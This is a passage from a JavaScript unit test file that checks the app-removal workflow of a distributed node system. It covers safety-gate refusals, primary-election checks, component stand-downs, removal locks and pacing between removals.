      expect(decision.reason).to.equal('NONE');
      sinon.assert.notCalled(probe);
    });
  });

  describe('the safety gate applies to BOTH reasons', () => {
    it('refuses a surplus removal that is not safe', async () => {
      // Before this, surplus removal deleted on an instance count alone - one of
      // the paths that has already destroyed customer volumes.
      //
      // LOCAL is LAST, so it is the junior instance and SURPLUS actually fires.
      // Third of four made this node the second-newest, reasonToGiveUpApp
      // returned giveUp: false, and the pass never reached the safety gate at
      // all - the test went green with the whole gate deleted.
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));
      evacuationSafety.canSafelyRemoveApp.resolves({ safe: false, reason: 'no connected peer holds it' });

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledWith(evacuationSafety.canSafelyRemoveApp, 'appone');
      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('performs a surplus removal that is safe', async () => {
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledWith(appUninstaller.removeAppLocally, 'appone');
    });

    it('asks the safety gate whether this node is the elected primary', async () => {
      // The gate refuses to hand back a `g:` app from under its primary - the
      // node writing to the volume - but it can only do that if the pass gives
      // it a way to ask. Without this the check defaults off and the primary
      // leaves mid-write.
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      const { isElectedPrimary } = evacuationSafety.canSafelyRemoveApp.firstCall.args[1];
      expect(isElectedPrimary).to.be.a('function');
      // No election has run in this pass, so the honest answer is "cannot say".
      // It must not be false: an election that has never run and an election
      // that has named another node are the difference between keeping a
      // volume and deleting it out from under its writer.
      expect(isElectedPrimary('appone')).to.equal(null);
    });

    it('tells the safety gate which components are running on this node', async () => {
      // The local half of the primary question. A node not running the g:
      // component cannot be the one writing, and that needs no FDM - which is
      // what stops a load-balancer outage stalling the trim fleet-wide.
      const appQueryService = require('../../ZelBack/src/services/appQuery/appQueryService');
      sinon.stub(appQueryService, 'listRunningApps').resolves({
        status: 'success',
        data: [{ Names: ['/fluxserver_appone'] }, { Names: ['/zelolderapp'] }],
      });
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      const { isComponentRunningLocally } = evacuationSafety.canSafelyRemoveApp.firstCall.args[1];
      expect(await isComponentRunningLocally('server_appone')).to.equal(true);
      // The pre-rename prefix is four characters, not five.
      expect(await isComponentRunningLocally('olderapp')).to.equal(true);
      expect(await isComponentRunningLocally('server_someotherapp')).to.equal(false);
    });

    it('treats an unreadable container list as "running here" rather than "not running"', async () => {
      // Answering "not running" on a list this node could not read would route
      // every app straight past the primary check - the exact shape of the
      // defect being closed.
      const appQueryService = require('../../ZelBack/src/services/appQuery/appQueryService');
      sinon.stub(appQueryService, 'listRunningApps').resolves({ status: 'error', data: 'docker down' });
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      const { isComponentRunningLocally } = evacuationSafety.canSafelyRemoveApp.firstCall.args[1];
      expect(await isComponentRunningLocally('anything_atall')).to.equal(true);
    });

    describe('a refusal that will not stop is a stuck node, and says so', () => {
      // fluxEventBus is disabled on a real node (config.testEventStream is
      // false), so the giveUp:safety event is a harness signal and nothing
      // reads it in production. The log is the whole of what an operator sees,
      // and a first refusal and a hundredth read identically at info.
      // The refusal counter is module state keyed by app name, so each of these
      // holds its own app: sharing one would make them depend on running order.
      it('logs the first refusals at info, and escalates once they persist', async () => {
        dbHelper.findInDatabase.resolves(installed('escalateapp'));
        const logInfo = sinon.stub(log, 'info');
        const logWarn = sinon.stub(log, 'warn');
        registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));
        evacuationSafety.canSafelyRemoveApp.resolves({
          safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds fluxappone in full',
        });

        for (let pass = 0; pass < 12; pass += 1) {
          // eslint-disable-next-line no-await-in-loop
          await advancedWorkflows.checkAndRemoveApplicationInstance();
        }

        const escalations = logWarn.getCalls()
          .map((c) => String(c.args[0]))
          .filter((m) => m.includes('passes running'));
        expect(escalations).to.have.lengthOf(1);
        expect(escalations[0]).to.contain('12 passes running');
        expect(escalations[0]).to.contain('NO_SYNCED_PEER');
        // and the quiet ones stayed quiet
        expect(logInfo.getCalls().filter((c) => String(c.args[0]).includes('not safe'))).to.have.lengthOf(11);
      });

      it('never removes the app, however long it has been refused', async () => {
        dbHelper.findInDatabase.resolves(installed('neverremoveapp'));
        // Every reason the gate refuses is a reason removing would be wrong:
        // the peers really are incomplete, so this copy is one of the few that
        // is not, or this node cannot see them, which is not evidence about
        // them. A surplus app is over-served, not down - nothing about it is
        // urgent enough to delete on evidence we have just said we lack.
        registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));
        evacuationSafety.canSafelyRemoveApp.resolves({
          safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
        });

        for (let pass = 0; pass < 40; pass += 1) {
          // eslint-disable-next-line no-await-in-loop
          await advancedWorkflows.checkAndRemoveApplicationInstance();
        }

        sinon.assert.notCalled(appUninstaller.removeAppLocally);
      });

      it('starts counting again once the app can be given up', async () => {
        dbHelper.findInDatabase.resolves(installed('resetapp'));
        const logWarn = sinon.stub(log, 'warn');
        registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));
        evacuationSafety.canSafelyRemoveApp.resolves({
          safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
        });
        for (let pass = 0; pass < 11; pass += 1) {
          // eslint-disable-next-line no-await-in-loop
          await advancedWorkflows.checkAndRemoveApplicationInstance();
        }

        // One clean pass, then refusals resume: the run is broken, so the next
        // escalation is a fresh twelve rather than the very next pass.
        evacuationSafety.canSafelyRemoveApp.resolves({ safe: true, code: 'STATELESS', reason: 'peer holds it' });
        await advancedWorkflows.checkAndRemoveApplicationInstance();
        evacuationSafety.canSafelyRemoveApp.resolves({
          safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
        });
        await advancedWorkflows.checkAndRemoveApplicationInstance();

        expect(logWarn.getCalls().map((c) => String(c.args[0])).filter((m) => m.includes('passes running')))
          .to.have.lengthOf(0);
      });

      it('does not restart the evacuation window on a surplus refusal', async () => {
        dbHelper.findInDatabase.resolves(installed('surplusonlyapp'));
        // forgetAppObservation clears the mark mayEvacuateApp paces on, and
        // only the evacuation path sets one. Calling it here cleared something
        // nothing had written.
        registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));
        evacuationSafety.canSafelyRemoveApp.resolves({
          safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
        });

        await advancedWorkflows.checkAndRemoveApplicationInstance();

        sinon.assert.notCalled(residentialNodeDosService.forgetAppObservation);
      });
    });

    it('does not start a pass that removeAppLocally would refuse', async () => {
      // removeAppLocally refuses when another removal holds the lock, and it
      // refuses by RETURNING - no throw, no status. So the pass logged "locally
      // removed", called noteEvacuated, burned the whole departure interval and
      // discarded the queue wait, for a removal that never happened. They do
      // collide: explorerService invokes this pass without awaiting it, and two
      // blocks later awaits expireGlobalApplications, which holds the lock
      // through a real uninstall.
      const globalState = require('../../ZelBack/src/services/utils/globalState');
      const previous = globalState.removalInProgress;
      globalState.removalInProgress = true;
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      try {
        await advancedWorkflows.checkAndRemoveApplicationInstance();
      } finally {
        globalState.removalInProgress = previous;
      }

      sinon.assert.notCalled(evacuationSafety.canSafelyRemoveApp);
      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('does not start a pass while an installation holds the lock', async () => {
      const globalState = require('../../ZelBack/src/services/utils/globalState');
      const previous = globalState.installationInProgress;
      globalState.installationInProgress = true;
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      try {
        await advancedWorkflows.checkAndRemoveApplicationInstance();
      } finally {
        globalState.installationInProgress = previous;
      }

      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('refuses an evacuation removal that is not safe, and restarts its observation', async () => {
      residentialNodeDosService.isEvacuating.returns(true);
      registryManager.appLocation.resolves(locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'));
      evacuationSafety.canSafelyRemoveApp.resolves({ safe: false, reason: 'no connected peer holds it' });

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(appUninstaller.removeAppLocally);
      sinon.assert.calledWith(residentialNodeDosService.forgetAppObservation, 'appone');
    });

    it('performs an evacuation removal that is safe and records it', async () => {
      residentialNodeDosService.isEvacuating.returns(true);
      registryManager.appLocation.resolves(locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledWith(appUninstaller.removeAppLocally, 'appone');
      sinon.assert.calledWith(residentialNodeDosService.noteEvacuated, 'appone');
    });

    it('does not record an evacuation when the removal was a surplus', async () => {
      registryManager.appLocation.resolves(locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(residentialNodeDosService.noteEvacuated);
    });
  });

  describe('standing down to hand a g: app back', () => {
    const dockerService = require('../../ZelBack/src/services/dockerService');
    let stopStub;

    beforeEach(() => {
      stopStub = sinon.stub(dockerService, 'appDockerStop').resolves();
      residentialNodeDosService.isEvacuating.returns(true);
      registryManager.appLocation.resolves(locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'));
      evacuationSafety.canSafelyRemoveApp.resolves({
        safe: false,
        code: 'STAND_DOWN_REQUIRED',
        reason: 'stop the component first',
        standDown: ['server_appone'],
      });
    });

    it('stops the component instead of removing the app', async () => {
      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledOnceWithExactly(stopStub, 'server_appone');
      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('tells the controller the component should be stopped, not just docker', async () => {
      // Found on a live fleet, not here. appReconciler takes a g: component's
      // desired state from controllerDesired; stopping the container while that
      // still reads 'running' means the reconciler starts it again on its next
      // sweep. The stand-down then reports success, the component keeps running,
      // and every later pass refuses with ELECTION_UNKNOWN because this node has
      // excluded itself from the election that would refresh the verdict.
      const appReconciler = require('../../ZelBack/src/services/appMonitoring/appReconciler');
      const desiredStub = sinon.stub(appReconciler, 'setControllerDesired');

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledWith(desiredStub, 'server_appone', 'stopped');
      // Before the container stop, so no sweep can land in between and undo it.
      sinon.assert.callOrder(desiredStub, stopStub);
    });

    it('does not count as a departure, so the pacing interval is not spent', async () => {
      // noteEvacuated starts the 6h gap before the next app may go. Spending it
      // on a pass that removed nothing would leave the node stood down and then
      // idle for hours before it could finish leaving.
      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(residentialNodeDosService.noteEvacuated);
    });

    it('is one action per pass, like a removal', async () => {
      dbHelper.findInDatabase.resolves(installed('appone', 'apptwo', 'appthree'));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledOnce(stopStub);
    });

    it('never stands down for SURPLUS, only for EVACUATION', async () => {
      // SURPLUS picks the JUNIOR instance and the primary is the senior one, so
      // a surplus giver-up is never the primary. Acting on the code here would
      // stop a container for a case that cannot arise.
      residentialNodeDosService.isEvacuating.returns(false);
      registryManager.appLocation.resolves(
        locations('5.6.7.8:16127', '9.9.9.9:16127', '8.8.8.8:16127', LOCAL),
      );

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(stopStub);
      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('gives up standing down after the cap, rather than holding a stopped app forever', async () => {
      // The state this guards against: stood down, and then unable to leave
      // anyway because the peer that held the folder went away. A component
      // stopped HERE and running NOWHERE is worse than the stuck-but-serving
      // state the stand-down exists to fix, so the node stops trying to leave
      // and stands for election again.
      const logWarn = sinon.stub(log, 'warn');
      evacuationSafety.canSafelyRemoveApp.onFirstCall().resolves({
        safe: false, code: 'STAND_DOWN_REQUIRED', reason: 'stop first', standDown: ['server_appone'],
      });
      evacuationSafety.canSafelyRemoveApp.resolves({
        safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
      });

      // The pass that stands down, then the cap's worth of passes that cannot.
      for (let i = 0; i < 8; i += 1) {
        // eslint-disable-next-line no-await-in-loop
        await advancedWorkflows.checkAndRemoveApplicationInstance();
      }

      const gaveUp = logWarn.getCalls()
        .map((c) => String(c.args[0]))
        .filter((line) => line.includes('standing for election again'));
      expect(gaveUp).to.have.lengthOf(1);
      expect(gaveUp[0]).to.include('server_appone');
      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('holds the stand-down while it is still within the cap', async () => {
      // Mutation guard for the test above: if the cap were off by enough to fire
      // immediately, that test would still pass and this one would not.
      const logWarn = sinon.stub(log, 'warn');
      evacuationSafety.canSafelyRemoveApp.onFirstCall().resolves({
        safe: false, code: 'STAND_DOWN_REQUIRED', reason: 'stop first', standDown: ['server_appone'],
      });
      evacuationSafety.canSafelyRemoveApp.resolves({
        safe: false, code: 'NO_SYNCED_PEER', reason: 'no connected peer holds it',
      });

      for (let i = 0; i < 3; i += 1) {
        // eslint-disable-next-line no-await-in-loop
        await advancedWorkflows.checkAndRemoveApplicationInstance();
      }

      const gaveUp = logWarn.getCalls()
        .map((c) => String(c.args[0]))
        .filter((line) => line.includes('standing for election again'));
      expect(gaveUp).to.have.lengthOf(0);
    });

    it('leaves a component it could not stop unmarked, so the next pass retries', async () => {
      // Marking a component this node is still writing to would make it
      // unelectable for something it is running - the worst of both states.
      stopStub.rejects(new Error('docker unreachable'));

      await advancedWorkflows.checkAndRemoveApplicationInstance();
      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledTwice(stopStub);
    });
  });

  describe('pacing', () => {
    it('gives up at most one app per pass', async () => {
      // Two removals in one pass would take two instances off the network before
      // the spawner has replaced either.
      dbHelper.findInDatabase.resolves(installed('appone', 'apptwo', 'appthree'));
      residentialNodeDosService.isEvacuating.returns(true);
      registryManager.appLocation.resolves(locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.calledOnce(appUninstaller.removeAppLocally);
    });

    it('does nothing at all when the node does not know its own address', async () => {
      fluxNetworkHelper.getLocalSocketAddress.resolves(null);
      residentialNodeDosService.isEvacuating.returns(true);
      registryManager.appLocation.resolves(locations(LOCAL, '5.6.7.8:16127', '9.9.9.9:16127'));

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });

    it('does nothing while the daemon is not synced', async () => {
      generalService.checkSynced.resolves(false);
      residentialNodeDosService.isEvacuating.returns(true);

      await advancedWorkflows.checkAndRemoveApplicationInstance();

      sinon.assert.notCalled(appUninstaller.removeAppLocally);
    });
  });
});
